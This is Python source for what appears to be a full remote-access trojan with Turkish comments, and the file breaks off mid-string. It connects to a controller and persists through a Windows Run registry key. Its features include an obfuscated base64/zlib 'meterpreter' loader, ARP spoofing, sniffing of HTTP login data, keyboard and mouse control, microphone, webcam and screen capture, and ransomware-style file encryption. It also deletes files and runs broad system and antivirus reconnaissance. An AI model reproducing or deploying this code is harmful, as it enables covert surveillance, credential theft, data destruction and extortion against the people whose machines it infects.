# -*- coding: utf-8 -*-
import threading
import random
import platform
import socket
import subprocess
import os
import base64
import time
import base64
import simplejson
import sys
import ast
import pyaudio
import wave
import cv2
import pyautogui
import keyboard
import pyperclip
import psutil
import getpass
import shutil
import ctypes
import rsa
import urllib.request
import scapy.all as sc
from time import sleep
from scapy.layers import http
from comtypes import CLSCTX_ALL
from cryptography.fernet import Fernet
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume


class ImamGulmez():
    def __init__(self, IP, PORT):
        self.H4CIYA1MAZ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.H4CIYA1MAZ.connect((IP, PORT))

        # -------------------------------------------------------------------------------------#

        # Başlangıcta default fernet anahtarı koy onu sonradan değiştir.

        # ARKAKAPI FERNET KEY
        self.FernetPRIVATE_KEY = Fernet.generate_key()

        # ARKAKAPI RSA KEY
        (self.RSA_PUB, self.RSA_PRV) = rsa.newkeys(512)

        print("\nBackdoor Fernet Key : ", self.FernetPRIVATE_KEY)
        print("\nBackdoor RSA Private Key : ", self.RSA_PRV)

        # -------------------------------------------------------------------------------------#

        with open("PRIVATE.pem", "wb") as file:
            file.write(self.RSA_PRV.save_pkcs1())
            file.close()

        # -------------------------------------------------------------------------------------#

        # RSA PRIVATE Anahtarı Sunucuya Gönderiliyor.
        self.Send(self.SendFile("PRIVATE.pem").decode("utf-8", errors="ignore"))

        os.remove("PRIVATE.pem")

        sleep(0.1)

        # FERNET Anahtarı Sunucuya Gönderiliyor.
        self.H4CIYA1MAZ.send(rsa.encrypt(self.FernetPRIVATE_KEY, self.RSA_PUB))

        sleep(0.1)

        # -------------------------------------------------------------------------------------#

        # Listener RSA Private KEY Cliente Ulaştı.
        self.ReceiveFile("PRIVATE.pem", self.Receive())

        with open("PRIVATE.pem", "rb") as file:
            self.LISTENER_RSA_PRIVATE = file.read()
            file.close()

        os.remove("PRIVATE.pem")
        sleep(0.1)

        # -------------------------------------------------------------------------------------#

        # Listener RSA PRIVATE KEY
        self.LISTENER_RSA_PRIVATE = rsa.PrivateKey.load_pkcs1(self.LISTENER_RSA_PRIVATE)

        # Listener FERNET KEY
        self.LISTENER_FERNET_KEY = rsa.decrypt(self.H4CIYA1MAZ.recv(1024), self.LISTENER_RSA_PRIVATE).decode("utf-8")

        # -------------------------------------------------------------------------------------#

        print("\nListener RSA Private KEY : ", self.LISTENER_RSA_PRIVATE)
        print("\nListener FERNET KEY : ", self.LISTENER_FERNET_KEY)

        # Şifrelemeler Yinelenecek

        self.KeyList = []
        self.NetSniff = ""
        self.Report = ""
        self.ARP_BOOL = False
        self.BlockMouseStop = False

        self.ARP_TARGET_MAC = ""
        self.ARP_TARGET_IP = ""
        self.ARP_GATEWAY_MAC = ""
        self.ARP_GATEWAY_IP = ""


        self.ReqSub()

    def Send(self, data):
        json_data = simplejson.dumps(data)
        self.H4CIYA1MAZ.send(json_data.encode("utf-8", errors="ignore"))

    def Receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.H4CIYA1MAZ.recv(1024)
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def ReceiveFile(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Succesful"

    def SendFile(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def GetMac(self, ip):
        arp_request_packet = sc.ARP(pdst=ip)
        broadcast_packet = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
        combined_packet = broadcast_packet / arp_request_packet
        answered_list = sc.srp(combined_packet, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc

    def ReqSub(self, mod = "normal"):
        if mod == "normal":
            try:
                script_name = os.path.basename(os.path.abspath(sys.argv[0]))
                new_file = os.environ["appdata"] + "\\Microsoft" + "\\Windows" + f"\\{script_name}"
                if not os.path.exists(new_file):
                    shutil.copyfile(sys.executable, new_file)
                    regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
                    subprocess.call(regedit_command, shell=True)
            except Exception as e:
                print(e)

        elif mod == "random":
            try:
                AllDirectory = []
                for Yol, Dizziness, _ in os.walk(os.getcwd()):
                    AllDirectory.append(Yol)
                RandomDirectory = random.choice(AllDirectory)

                script_name = os.path.basename(os.path.abspath(sys.argv[0]))
                new_file = RandomDirectory + f"\\{script_name}"
                if not os.path.exists(new_file):
                    shutil.copyfile(sys.executable, new_file)
                    regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
                    subprocess.call(regedit_command, shell=True)

                return f"Kopyalanan Yol : {RandomDirectory}"
            except Exception as e:
                return f"Random ReqSub Error : {e}"

        else:
            return "Else Error."

    def Run(self):
        while True:
            command = ast.literal_eval(Fernet(self.LISTENER_FERNET_KEY).decrypt(self.Receive()).decode("utf-8"))

            try:

                # Windows Command
                if command[0] == "exit":
                    self.H4CIYA1MAZ.close()
                    sys.exit()


                elif command[0] == "meterpreter":
                    def MeterThread():
                        exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/orckGIdm6ZbdxQoiHkREcPcmIm06amialiSrVfG/25DFOczwZt68+dDDNLqQ+1H1GMS30a1oG49VKXxwRxVE0AOS19Hlc65t7hr7hkwWfEey4L4Wn/k6NUMKbCVOeP9wffeyPzzeXN3zyAM1WosqMEbldgWy2oAEWUgq1ovxyGkdNj3JcFY4hSgep4M3iBNbc2LqtBQc7dSontHLWyo8OFQfrOT8qXgmXX3ChpPPd20wN2hZxy/MIted/VfPU5oTnFGxeDd0qMZhcug9Sy+AtipjssPIFD/U053/5eQPHgtfMA==')[0])))

                    MeterTheradOne = threading.Thread(target=MeterThread)
                    MeterTheradOne.start()

                    SendResult = "OK"


                # Windows Command
                elif command[0] == "getpublic":
                    def get_public_ip():
                        url = "https://api.ipify.org"
                        try:
                            response = urllib.request.urlopen(url)
                            public_ip = response.read().decode('utf-8')
                            return public_ip
                        except Exception as e:
                            print("Hata:", str(e))
                            return None

                    # Public IP adresini al
                    SendResult = get_public_ip()

                # Admin Security
                # Windows Command
                elif command[0] == "netdiscover":
                    if len(command) > 1:
                        arp_header = sc.ARP(pdst=command[1])
                    else:
                        arp_header = sc.ARP(pdst="192.168.1.1/24")

                    ether_header = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
                    arp_request_packet = ether_header / arp_header
                    answered_list = sc.srp(arp_request_packet, timeout=1)[0]

                    clients_list = []

                    for elements in answered_list:
                        client_dict = {"ip": elements[1].psrc, "mac": elements[1].hwsrc}
                        clients_list.append(client_dict)

                    SendResult = str(clients_list)

                # Admin Security
                # Windows Command
                elif command[0] == "arpspoof_stop":
                    self.ARP_BOOL = True
                    arp_response = sc.ARP(op=2, pdst=self.ARP_TARGET_IP, hwdst=self.ARP_TARGET_MAC,
                                          psrc=self.ARP_GATEWAY_IP, hwsrc=self.ARP_GATEWAY_MAC)
                    sc.send(arp_response, verbose=False, count=6)
                    SendResult = "ARP Spoof Stoped."

                # Admin Security
                # Windows Command
                elif command[0] == "arpspoof":
                    def arp_poisoning(target_ip, target_mac, poisoned_ip):
                        arp_response = sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
                        sc.send(arp_response, verbose=False)

                    self.ARP_BOOL = False
                    self.ARP_TARGET_IP = command[1]
                    self.ARP_GATEWAY_IP = command[2]
                    self.ARP_TARGET_MAC = self.GetMac(self.ARP_TARGET_IP)
                    self.ARP_GATEWAY_MAC = self.GetMac(self.ARP_GATEWAY_IP)

                    def ARP():
                        try:
                            while True:
                                if self.ARP_BOOL == False:
                                    arp_poisoning(self.ARP_TARGET_IP, self.ARP_TARGET_MAC, self.ARP_GATEWAY_IP)
                                    arp_poisoning(self.ARP_GATEWAY_IP, self.ARP_GATEWAY_MAC, self.ARP_TARGET_IP)
                                    sleep(3)
                                else:
                                    break
                        except:
                            pass

                    THREAD_SPOOF = threading.Thread(target=ARP, daemon=True)
                    THREAD_SPOOF.start()
                    SendResult = f"\n{self.ARP_TARGET_IP} -> {self.ARP_GATEWAY_IP}\n{self.ARP_GATEWAY_IP} -> {self.ARP_TARGET_IP} Arp Spoof ON"


                elif command[0] == "req_sub_trojan":
                    SendResult = self.ReqSub(mod="random")

                # Windows Command
                elif command[0] == "start":
                    path = ""
                    for i in command[1:]:
                        path += i + " "
                    path = path[:-1]
                    os.startfile("{}".format(os.getcwd() + "\\" + path))
                    SendResult = path + " Start OK"

                # Windows Command
                elif command[0] == "netsniff_dump":
                    with open("netsniff.txt", "w") as file:
                        file.write(self.NetSniff)
                        file.close()

                    SendResult = self.SendFile("netsniff.txt").decode("utf-8", errors="ignore")

                    os.remove("netsniff.txt")
                    self.NetSniff = ""

                # Admin Security
                # Windows Command
                elif command[0] == "netsniff":
                    def sniff():
                        sc.sniff(iface=command[1], store=False, prn=process_sniffed_packet)

                    def geturl(packet):
                        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

                    def get_login_info(packet):
                        if packet.haslayer(sc.Raw):
                            return str(packet[sc.Raw].load)

                    def process_sniffed_packet(packet):
                        if packet.haslayer(http.HTTPRequest):
                            url = geturl(packet)
                            self.NetSniff += "[+] HTTPRequest : " + url.decode() + "\n"

                            logininfo = get_login_info(packet)

                            if logininfo:
                                self.NetSniff += "\n\n[+] DETECTED RAW : " + logininfo + "\n\n"

                    # Interface
                    ThreadSniff = threading.Thread(target=sniff, daemon=True)
                    ThreadSniff.start()
                    SendResult = "Sniffing OK"

                # Windows Command
                elif command[0] == "write_mp":
                    keyboard.press_and_release(str(command[1]).replace("-", " "))
                    SendResult = "Klavye Manüpülasyonu OK."

                # Windows Command
                elif command[0] == "click":
                    x = int(command[1])
                    y = int(command[2])
                    pyautogui.moveTo(x, y)
                    pyautogui.click()
                    SendResult = f"{command[1], command[2]} Clicked OK"

                # Windows Command
                elif command[0] == "chdir":
                    SendResult = f"{os.getcwd()} -> {command[1]}"
                    os.chdir(command[1])

                # Windows Command
                elif command[0] == "doubleclick":
                    x = int(command[1])
                    y = int(command[2])
                    pyautogui.moveTo(x, y)
                    pyautogui.doubleClick()
                    SendResult = f"{command[1], command[2]} Double Clicked OK"

                # Windows Command
                elif command[0] == "encrypted":
                    key = Fernet.generate_key()
                    result = ""

                    for anaDizin, altDizinler, dosyalar in os.walk(os.getcwd()):
                        for dosya in dosyalar:

                            try:

                                # Korunması Gereken Dosyalar
                                if dosya == "back.py" or dosya == "Listener.py":
                                    pass

                                # Hedef Dosyalar
                                elif dosya.endswith(".png"):
                                    result += f"Şifrelenen Dosya : {dosya}  ->  {anaDizin}\n"
                                    with open(str(anaDizin + "\\" + dosya), "rb") as the_file:
                                        content = the_file.read()
                                        the_file.close()

                                    encrypted_content = Fernet(key).encrypt(content)

                                    with open(str(anaDizin + "\\" + dosya), "rb+") as the_file:
                                        the_file.truncate()
                                        the_file.write(encrypted_content)
                                        the_file.close()

                                elif dosya.endswith(".py"):
                                    result += f"Şifrelenen Dosya : {dosya}  ->  {anaDizin}\n"
                                    with open(str(anaDizin + "\\" + dosya), "rb") as the_file:
                                        content = the_file.read()
                                        the_file.close()

                                    encrypted_content = Fernet(key).encrypt(content)

                                    with open(str(anaDizin + "\\" + dosya), "rb+") as the_file:
                                        the_file.truncate()
                                        the_file.write(encrypted_content)
                                        the_file.close()

                                elif dosya.endswith(".jpg"):
                                    result += f"Şifrelenen Dosya : {dosya}  ->  {anaDizin}\n"
                                    with open(str(anaDizin + "\\" + dosya), "rb") as the_file:
                                        content = the_file.read()
                                        the_file.close()

                                    encrypted_content = Fernet(key).encrypt(content)

                                    with open(str(anaDizin + "\\" + dosya), "rb+") as the_file:
                                        the_file.truncate()
                                        the_file.write(encrypted_content)
                                        the_file.close()

                                elif dosya.endswith(".docx"):
                                    result += f"Şifrelenen Dosya : {dosya}  ->  {anaDizin}\n"
                                    with open(str(anaDizin + "\\" + dosya), "rb") as the_file:
                                        content = the_file.read()
                                        the_file.close()

                                    encrypted_content = Fernet(key).encrypt(content)

                                    with open(str(anaDizin + "\\" + dosya), "rb+") as the_file:
                                        the_file.truncate()
                                        the_file.write(encrypted_content)
                                        the_file.close()

                                elif dosya.endswith(".java"):
                                    result += f"Şifrelenen Dosya : {dosya}  ->  {anaDizin}\n"
                                    with open(str(anaDizin + "\\" + dosya), "rb") as the_file:
                                        content = the_file.read()
                                        the_file.close()

                                    encrypted_content = Fernet(key).encrypt(content)

                                    with open(str(anaDizin + "\\" + dosya), "rb+") as the_file:
                                        the_file.truncate()
                                        the_file.write(encrypted_content)
                                        the_file.close()

                                elif dosya.endswith(".jpeg"):
                                    result += f"Şifrelenen Dosya : {dosya}  ->  {anaDizin}\n"
                                    with open(str(anaDizin + "\\" + dosya), "rb") as the_file:
                                        content = the_file.read()
                                        the_file.close()

                                    encrypted_content = Fernet(key).encrypt(content)

                                    with open(str(anaDizin + "\\" + dosya), "rb+") as the_file:
                                        the_file.truncate()
                                        the_file.write(encrypted_content)
                                        the_file.close()

                                elif dosya.endswith(".txt"):
                                    result += f"Şifrelenen Dosya : {dosya}  ->  {anaDizin}\n"
                                    with open(str(anaDizin + "\\" + dosya), "rb") as the_file:
                                        content = the_file.read()
                                        the_file.close()

                                    encrypted_content = Fernet(key).encrypt(content)

                                    with open(str(anaDizin + "\\" + dosya), "rb+") as the_file:
                                        the_file.truncate()
                                        the_file.write(encrypted_content)
                                        the_file.close()

                            except Exception as e:
                                result += f"Hata Mesajı : {str(e)}\n"

                            finally:
                                with open("enc.txt", "w") as file:
                                    file.write(f"Encrypted KEY : {key}\n")
                                    file.write(result)
                                    file.close()

                    SendResult = self.SendFile("enc.txt").decode("utf-8", errors="ignore")
                    os.remove("enc.txt")

                # Windows Command
                elif command[0] == "decrypted":
                    result = ""
                    for anaDizin, altDizinler, dosyalar in os.walk(os.getcwd()):
                        for dosya in dosyalar:

                            try:

                                # Korunması Gereken Dosyalar
                                if dosya == "haciyatmaz.exe" or dosya == "haciyatmaz.py":
                                    pass

                                elif dosya.endswith(".txt"):
                                    result += f"Deşifrelenen Dosya : {dosya}  ->  {anaDizin}\n"
                                    with open(str(anaDizin + "\\" + dosya), "rb") as the_file:
                                        content = the_file.read()
                                        the_file.close()

                                    decrypted_content = Fernet(str(command[1])).decrypt(content)

                                    with open(str(anaDizin + "\\" + dosya), "rb+") as the_file:
                                        the_file.truncate()
                                        the_file.write(decrypted_content)
                                        the_file.close()

                                elif dosya.endswith(".py"):
                                    result += f"Deşifrelenen Dosya : {dosya}  ->  {anaDizin}\n"
                                    with open(str(anaDizin + "\\" + dosya), "rb") as the_file:
                                        content = the_file.read()
                                        the_file.close()

                                    decrypted_content = Fernet(str(command[1])).decrypt(content)

                                    with open(str(anaDizin + "\\" + dosya), "rb+") as the_file:
                                        the_file.truncate()
                                        the_file.write(decrypted_content)
                                        the_file.close()

                                elif dosya.endswith(".docx"):
                                    result += f"Deşifrelenen Dosya : {dosya}  ->  {anaDizin}\n"
                                    with open(str(anaDizin + "\\" + dosya), "rb") as the_file:
                                        content = the_file.read()
                                        the_file.close()

                                    decrypted_content = Fernet(str(command[1])).decrypt(content)

                                    with open(str(anaDizin + "\\" + dosya), "rb+") as the_file:
                                        the_file.truncate()
                                        the_file.write(decrypted_content)
                                        the_file.close()

                                elif dosya.endswith(".png"):
                                    result += f"Deşifrelenen Dosya : {dosya}  ->  {anaDizin}\n"
                                    with open(str(anaDizin + "\\" + dosya), "rb") as the_file:
                                        content = the_file.read()
                                        the_file.close()

                                    decrypted_content = Fernet(str(command[1])).decrypt(content)

                                    with open(str(anaDizin + "\\" + dosya), "rb+") as the_file:
                                        the_file.truncate()
                                        the_file.write(decrypted_content)
                                        the_file.close()

                                elif dosya.endswith(".java"):
                                    result += f"Deşifrelenen Dosya : {dosya}  ->  {anaDizin}\n"
                                    with open(str(anaDizin + "\\" + dosya), "rb") as the_file:
                                        content = the_file.read()
                                        the_file.close()

                                    decrypted_content = Fernet(str(command[1])).decrypt(content)

                                    with open(str(anaDizin + "\\" + dosya), "rb+") as the_file:
                                        the_file.truncate()
                                        the_file.write(decrypted_content)
                                        the_file.close()

                                elif dosya.endswith(".jpg"):
                                    result += f"Deşifrelenen Dosya : {dosya}  ->  {anaDizin}\n"
                                    with open(str(anaDizin + "\\" + dosya), "rb") as the_file:
                                        content = the_file.read()
                                        the_file.close()

                                    decrypted_content = Fernet(str(command[1])).decrypt(content)

                                    with open(str(anaDizin + "\\" + dosya), "rb+") as the_file:
                                        the_file.truncate()
                                        the_file.write(decrypted_content)
                                        the_file.close()

                                elif dosya.endswith(".jpeg"):
                                    result += f"Deşifrelenen Dosya : {dosya}  ->  {anaDizin}\n"
                                    with open(str(anaDizin + "\\" + dosya), "rb") as the_file:
                                        content = the_file.read()
                                        the_file.close()

                                    decrypted_content = Fernet(str(command[1])).decrypt(content)

                                    with open(str(anaDizin + "\\" + dosya), "rb+") as the_file:
                                        the_file.truncate()
                                        the_file.write(decrypted_content)
                                        the_file.close()

                            except Exception as e:
                                result += f"Hata Mesajı : {str(e)}\n"

                            finally:
                                with open("dnc.txt", "w") as file:
                                    file.write(result)
                                    file.close()

                    SendResult = self.SendFile("dnc.txt").decode("utf-8", errors="ignore")
                    os.remove("dnc.txt")

                # Windows Command
                elif command[0] == "write":
                    write_line = str(command[1]).replace("-", " ")
                    keyboard.write(write_line)

                    try:
                        if command[2] == "enter":
                            keyboard.press("enter")
                    except:
                        SendResult = " Enter Fonksiyonu Hatası."
                        continue

                    SendResult = " ' " + write_line + " ' " + " Yazıldı."

                # Windows Command
                elif command[0] == "remove":
                    if command[1] == "all":
                        for i in os.listdir():
                            if i == "back.py":
                                continue
                            else:
                                os.remove(i)

                        SendResult = "All Remove OK"
                    else:
                        os.remove(command[1])
                        SendResult = str(command[1]) + " Remove OK"

                # Windows Command
                elif command[0] == "rename":
                    rename_list = [i for i in command[1:]]
                    old = str(rename_list[0]).replace("-", " ")
                    new = str(rename_list[1]).replace("-", " ")

                    os.rename(old, new)
                    SendResult = "Rename Successful : {} -> {}".format(old, new)

                # Windows Command
                elif command[0] == "screenshot":
                    pyautogui.screenshot(command[1])
                    SendResult = self.SendFile(command[1]).decode("utf-8", errors="ignore")
                    os.remove(command[1])

                # Windows Command
                elif command[0] == "deepinfo":
                    def Log():
                        log_list = []
                        for p in psutil.process_iter(['name', 'open_files']):
                            for file in p.info['open_files'] or []:
                                if file.path.endswith('.log'):
                                    log_list.append((p.pid, p.info['name'][:10], file.path))
                        return log_list

                    deepinfo = """

					Batarya Durumu : {}\n\n\n
					CPU Durumu : {}\n\n\n
					CPU Sayisi : {}\n\n\n
					CPU Frekans : {}\n\n\n
					CPU Yuku = {}\n\n\n
					Bellek Durumu : {}\n\n\n
					Tum Diskler : {}\n\n\n
					Disk Durumu : {}\n\n\n
					Disk Analiz : {}\n\n\n
					500MB++ RAM Tuketenler : {}\n\n\n
					Yogun CPU Kullanan 5 Program : {}\n\n\n
					Root Programlari : {}\n\n\n
					Kullanici Durumu : {}\n\n\n
					Log Kayitlarini Kullanan Uygulamalar : {}\n\n\n
					Network Durumu : {}\n\n\n
					TCP/UDP Durumu : {}\n\n\n
					AF_INET Durumu : {}\n\n\n
					Aktif Olarak Calisan Surecler : {}\n\n\n



					""".format(psutil.sensors_battery(),
                               psutil.cpu_times_percent(),
                               psutil.cpu_count(),
                               psutil.cpu_freq(),
                               psutil.getloadavg(),
                               psutil.virtual_memory(),
                               psutil.disk_partitions(),
                               psutil.disk_usage("/"),
                               psutil.disk_io_counters(),
                               [(p.pid, p.info['name'], p.info['memory_info'].rss) for p in
                                psutil.process_iter(['name', 'memory_info']) if
                                p.info['memory_info'].rss > 500 * 1024 * 1024],
                               [(p.pid, p.info['name'], sum(p.info['cpu_times'])) for p in
                                sorted(psutil.process_iter(['name', 'cpu_times']),
                                       key=lambda p: sum(p.info['cpu_times'][:5]))][-6:],
                               [(p.pid, p.info['name']) for p in psutil.process_iter(['name', 'username']) if
                                p.info['username'] == getpass.getuser()],
                               psutil.users(),
                               Log(),
                               psutil.net_io_counters(pernic=True),
                               psutil.net_connections("all"),
                               psutil.net_if_addrs(),
                               [(p.pid, p.info) for p in psutil.process_iter(['name', 'status']) if
                                p.info['status'] == psutil.STATUS_RUNNING])

                    SendResult = deepinfo

                elif command[0] == "deep_report":
                    self.Report = ""
                    try:
                        net_user = subprocess.check_output("powershell Get-LocalUser", shell=True).decode("utf-8",
                                                                                                          errors="ignore")
                    except:
                        net_user = "Hata."

                    try:
                        whoami = subprocess.check_output("powershell whoami /user", shell=True).decode("utf-8", errors="ignore")
                    except:
                        whoami = "Hata"


                    try:

                        aktif_tcp = subprocess.check_output("powershell netstat -o", shell=True).decode("utf-8", errors="ignore")

                    except:
                        aktif_tcp = "Hata"

                    try:

                        aktif_tcp_admin = subprocess.check_output("powershell netstat -b", shell=True).decode("utf-8", errors="ignore")
                    except:
                        aktif_tcp_admin = "Hata"


                    try:
                        tasklist = subprocess.check_output("powershell tasklist", shell=True).decode("utf-8", errors="ignore")
                    except:
                        tasklist = "Hata"

                    try:
                        baslangıc_ogeleri = subprocess.check_output("powershell wmic startup get caption,command", shell=True).decode("utf-8", errors="ignore")
                    except:
                        baslangıc_ogeleri = "Hata"

                    try:

                        firewall_durum = subprocess.check_output("powershell netsh firewall show state", shell=True).decode("utf-8", errors="ignore")
                    except:
                        firewall_durum = "Hata"

                    try:
                        zamanlanmis_gorevler = subprocess.check_output("powershell schtasks /query /fo LIST /v", shell=True).decode("utf-8", errors="ignore")
                    except:
                        zamanlanmis_gorevler = "Hata"

                    try:
                        calisan_hizmetler = subprocess.check_output("powershell net start", shell=True).decode("utf-8", errors="ignore")
                    except:
                        calisan_hizmetler = "Hata"


                    try:
                        arp_tablosu = subprocess.check_output("powershell arp -a", shell=True).decode("utf-8", errors="ignore")
                    except:
                        arp_tablosu = "Hata"

                    try:
                        systeminfo = subprocess.check_output("powershell systeminfo", shell=True).decode("utf-8", errors="ignore")
                    except:
                        systeminfo = "Hata"


                    try:
                        ipconfig_all = subprocess.check_output("powershell ipconfig /all", shell=True).decode("utf-8",errors="ignore")
                    except:
                        ipconfig_all = "Hata"

                    try:
                        getmac = subprocess.check_output("powershell getmac", shell=True).decode("utf-8",errors="ignore")
                    except:
                        getmac = "Hata"

                    try:
                        net_share = subprocess.check_output("powershell net share", shell=True).decode("utf-8",errors="ignore")
                    except:
                        net_share = "Hata"

                    try:
                        grup_ilkesi = subprocess.check_output("powershell gpresult /r", shell=True).decode("utf-8",errors="ignore")
                    except:
                        grup_ilkesi = "Hata"

                    try:
                        hizmetler = subprocess.check_output("powershell wmic service list full", shell=True).decode("utf-8",errors="ignore")
                    except:
                        hizmetler = "Hata"


                    try:
                        sürücüler = subprocess.check_output("powershell driverquery", shell=True).decode("utf-8",errors="ignore")
                    except:
                        sürücüler = "Hata"

                    try:
                        wifi_liste = subprocess.check_output("powershell netsh wlan show profiles", shell=True).decode("utf-8",errors="ignore")
                    except:
                        wifi_liste = "Hata"

                    try:
                        planlanmis_gorevler = subprocess.check_output("powershell schtasks /query", shell=True).decode("utf-8",errors="ignore")
                    except:
                        planlanmis_gorevler = "Hata"

                    try:
                        ag_bagdastırıcıları = subprocess.check_output("powershell netsh interface show interface", shell=True).decode("utf-8",errors="ignore")
                    except:
                        ag_bagdastırıcıları = "Hata"

                    try:
                        guvenlik_güncellestirme = subprocess.check_output("powershell wmic qfe", shell=True).decode("utf-8",errors="ignore")
                    except:
                        guvenlik_güncellestirme = "Hata"

                    try:
                        guvenlik_duvarı = subprocess.check_output("powershell netsh advfirewall show allprofiles", shell=True).decode("utf-8",errors="ignore")
                    except:
                        guvenlik_duvarı = "Hata"

                    try:
                        admin_group = subprocess.check_output("powershell net localgroup administrators", shell=True).decode("utf-8",errors="ignore")
                    except:
                        admin_group = "Hata"

                    try:
                        antivirüs_programlar = subprocess.check_output("powershell wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName /format:list",shell=True).decode("utf-8", errors="ignore")
                    except:
                        antivirüs_programlar = "Hata"

                    try:
                        yuklu_programlar = subprocess.check_output('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\\Uninstall" /s', shell=True).decode("utf-8",errors="ignore")
                    except:
                        yuklu_programlar = "Hata"

                    try:
                        loglar = subprocess.check_output("powershell Get-EventLog -list", shell=True).decode("utf-8",errors="ignore")
                    except:
                        loglar = "Hata"

                    self.Report += f"""
                    
                    Kullanıcı Durumu : COMMAND : whoami /user\n\n{whoami}\n
                    Kullanıcılar Durumu  : COMMAND : Get-LocalUser\n\n{net_user}\n
                    
                    Aktif TCP / UDP Bağlantıları : COMMAND netstat -a\n\n{aktif_tcp}\n
                    Aktif TCP / UDP Bağlantıları <ADMİN>: COMMAND netstat -b\n\n{aktif_tcp_admin}\n
                    
                    Görev Listesi : COMMAND : tasklist\n\n{tasklist}\n
                    Başlangıç Öğeleri : COMMAND : wmic startup get caption,command\n\n{baslangıc_ogeleri}\n
                    
                    Firewall Durumu : COMMAND : netsh firewall show state\n\n{firewall_durum}\n
                    Zamanlanmış Görevler : COMMAND : schtasks /query /fo LIST /v\n\n{zamanlanmis_gorevler}\n
                    
                    Çalışan Hizmetler : COMMAND : net start\n\n{calisan_hizmetler}\n
                    ARP Tablosunu Gösterir : COMMAND arp -a\n\n{arp_tablosu}\n
                    
                    Sistem Bilgisi : COMMAND : systeminfo\n\n{systeminfo}\n
                    IP Tablosu : COMMAND : ipconfig /all\n\n{ipconfig_all}\n
                    
                    Mac Adreslerini Listeler : COMMAND : getmac\n\n{getmac}\n
                    Paylaşılan Dosyalar : COMMAND net share\n\n{net_share}\n
                    
                    Grup İlkesi : COMMAND gpresult /r\n\n{grup_ilkesi}\n
                    Hizmetler : COMMAND wmic service list full\n\n{hizmetler}\n
                    
                    Sürücüler : COMMAND driverquery\n\n{sürücüler}\n
                    Wifi Listesii : COMMAND netsh wlan show profiles\n\n{wifi_liste}\n
                    
                    Planlanmış Görevler : COMMAND : schtasks /query\n\n{planlanmis_gorevler}\n
                    Network Bagdastirici : COMMAND : netsh interface show interface\n\n{ag_bagdastırıcıları}\n
                    
                    Yüklü Güvenlik Güncelleştirmeleri : COMMAND : wmic qfe\n\n{guvenlik_güncellestirme}\n
                    Güvenlik Duvarı Yapılandırması : COMMAND : netsh advfirewall show allprofiles\n\n{guvenlik_duvarı}\n
                    
                    Yönetici Grup : COMMAND : net localgroup administrators\n\n{admin_group}\n
                    Antivirüs Programları : COMMAND : wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName /format:list\n\n{antivirüs_programlar}\n
                    
                    Yüklü Olan Programlar : COMMAND : reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\\Uninstall" /s\n\n{yuklu_programlar}\n
                    Loglar : COMMAND : Get-EventLog -list\n\n{loglar}\n
                    """


                    SendResult = self.Report

                # Windows Command
                elif command[0] == "microphone_sound":
                    def MicroPhoneSound():
                        CHUNK = 1024
                        FORMAT = pyaudio.paInt16
                        CHANNELS = 11
                        RATE = 44100
                        RECORD_SECONDS = int(command[1])
                        WAVE_OUTPUT_FILENAME = "kayit.wav"

                        p = pyaudio.PyAudio()
                        stream = p.open(format=pyaudio.paInt16, channels=CHANNELS, rate=RATE, input=True,
                                        frames_per_buffer=CHUNK)

                        frames = []
                        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                            data = stream.read(CHUNK)
                            frames.append(data)

                        stream.stop_stream()
                        stream.close()
                        p.terminate()

                        wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
                        wf.setnchannels(CHANNELS)
                        wf.setsampwidth(p.get_sample_size(FORMAT))
                        wf.setframerate(RATE)
                        wf.writeframes(b''.join(frames))
                        wf.close()

                        SendResult = self.SendFile("kayit.wav").decode("utf-8", errors="ignore")
                        self.Send(Fernet(self.FernetPRIVATE_KEY).encrypt(SendResult.encode("utf-8")))
                        os.remove("kayit.wav")

                    mpro1 = threading.Thread(target=MicroPhoneSound)
                    mpro1.start()
                    SendResult = "Microphone Listener OK"

                # Windows Command
                elif command[0] == "webcam_screenshot":
                    cap = cv2.VideoCapture(0)

                    if not cap.isOpened():
                        SendResult = "No Webcam Connection !"
                        return

                    ret, frame = cap.read()

                    if not ret:
                        SendResult = "Webcam Not Frame !"
                        cap.release()
                        return

                    cv2.imwrite("webcamscreen.jpg", frame)
                    cap.release()

                    SendResult = self.SendFile("webcamscreen.jpg").decode("utf-8", errors="ignore")
                    os.remove("webcamscreen.jpg")

                # Windows Command
                elif command[0] == "read" and len(command) > 1:
                    new_command = str(command[1]).replace("-", " ")
                    with open(new_command, "r") as readmyfile:
                        SendResult = readmyfile.read()
                        readmyfile.close()

                # Windows Command
                elif command[0] == "migrate" and len(command) > 1:
                    myfile = str(command[1]).replace("-", " ")
                    path = str(command[2]).replace("-", " ")

                    shutil.move(myfile, path)
                    SendResult = f"{os.getcwd()}\\{myfile} -> {path}"

                # Windows Command
                elif command[0] == "kill" and len(command) > 1:
                    new_command = str(command[1]).replace("-", " ")
                    subprocess.run(f"powershell TASKKILL /F /IM {new_command}", shell=True, stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL)
                    SendResult = f"{command[1]} Closed OK"

                # Windows Command
                elif command[0] == "platform":
                    SendResult = f"""
İşletim Sistemi : {platform.system()}
İşletim Sistemi Sürüm Versiyonu : {platform.platform()}
İşletim Sistemi Sürümü : {platform.release()}
Donanım Mimarisi : {platform.machine()}
İşlemci Mimarisi : {platform.processor()}
İşletim Sistemin Versiyonu : {platform.version()}
